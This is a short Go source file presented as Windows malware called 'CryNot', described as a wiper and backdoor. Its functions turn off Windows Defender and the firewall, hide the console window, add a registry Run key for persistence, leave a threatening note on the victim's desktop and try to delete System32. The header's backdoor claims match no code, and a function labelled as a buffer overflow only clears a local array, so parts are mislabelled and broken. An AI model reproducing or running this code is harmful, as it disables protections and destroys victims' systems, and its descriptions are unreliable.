// Software title: CryNot - A Simple Wiper
// Description: This is a simple Wiper for Windows. It is written in Go and is cross-compiled for Windows. It is a simple backdoor that can be used to execute commands on the victim's machine. It can also be used to download and upload files to and from the victim's machine. It is a simple backdoor that can be used to execute commands on the victim's machine. It can also be used to download and upload files to and from the victim's machine.
// Version: 1.0
// Author g0d/rootkithun7er

package main

import (
	"os"
	"os/exec"
	"os/user"
	"path"
)

// First function of Hiding the backdoor process from the task manager
func HideProcess() {
	cmd := exec.Command("powershell", "Add-Type -Name Console -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);';$consolePtr = [Console]::GetConsoleWindow();[Console]::ShowWindow($consolePtr, 0);")
	cmd.Run()
}

// Now we disable the Windows Defender and firewall
func DisableDefender() {
	cmd := exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true")
	cmd.Run()
}

// Firewall
func firewall_OFF() {
	cmd := exec.Command("powershell", "netsh advfirewall set allprofiles state off")
	cmd.Run()
}

// Change the registry to make the malware persistent
func ChangeRegistry() {
	cmd := exec.Command("cmd", "/C", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\backdoor.exe")
	cmd.Run()
}

// Crea una nota en el escritorio usando la libreria os/user
func VictimNote() {
	user, _ := user.Current()
	desktop := path.Join(user.HomeDir, "Desktop")
	file, _ := os.Create(desktop + "\\README.txt")
	file.WriteString("Your computer has been hacked by CryNot, do not try to remove the File or you will lose all your data. and your pc will be destroyed automatically.")
	file.Close()
}

// Si el usuario intenta eliminar el archivo README.txt, se eliminara el system32 de Windows
func DeleteSystem32() {
	cmd := exec.Command("cmd", "/C", "del C:\\Windows\\System32")
	cmd.Run()
}

//Buffer overflow writing in the system memory, to crash the system. corrupting the system memory
func BufferOverflow() {
	var buffer [1000]byte
	for i := 0; i < 1000; i++ {
		buffer[i] = 0
	}
}

func main() {
	VictimNote()
	DeleteSystem32()
	ChangeRegistry()
	HideProcess()
	firewall_OFF()
	DisableDefender()
	BufferOverflow()
}
